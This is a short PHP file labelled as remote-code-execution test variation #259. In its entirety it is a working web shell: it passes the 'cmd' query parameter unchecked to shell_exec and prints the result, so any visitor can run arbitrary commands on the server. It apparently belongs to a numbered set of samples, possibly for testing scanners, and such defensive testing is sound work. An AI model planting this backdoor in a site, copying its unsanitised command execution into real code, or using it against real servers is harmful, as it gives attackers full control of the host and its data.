<?php
// RCE test variation #259
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>